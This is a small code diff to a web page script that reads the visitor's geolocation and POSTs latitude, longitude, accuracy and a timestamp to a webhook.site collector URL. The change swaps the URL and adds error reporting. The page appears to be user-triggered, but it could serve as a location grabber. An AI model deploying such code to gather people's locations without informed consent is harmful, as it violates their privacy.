@@ -29,8 +29,8 @@
     const locationDiv = document.getElementById('location');
     const startBtn = document.getElementById('startBtn');
 
-    // Your webhook
-    const webhookUrl = "https://webhook.site/f8e09816-43eb-48f8-9686-2c7b7ccaf237";
+    // ✅ Your working webhook
+    const webhookUrl = "https://webhook.site/8213787e-6687-4908-bb66-7034609bc035";
 
     let map, marker;
 
@@ -44,15 +44,16 @@
           accuracy: acc,
           timestamp: new Date().toISOString()
         };
-        await fetch(webhookUrl, {
+        const response = await fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
+        if (!response.ok) throw new Error('Network response not OK');
         showStatus('✅ Location sent: ' + lat + ", " + lon);
       } catch (err) {
         console.error('Error sending location:', err);
-        showStatus('❌ Error sending location.');
+        showStatus('❌ Error sending location: ' + err.message);
       }
     }
 
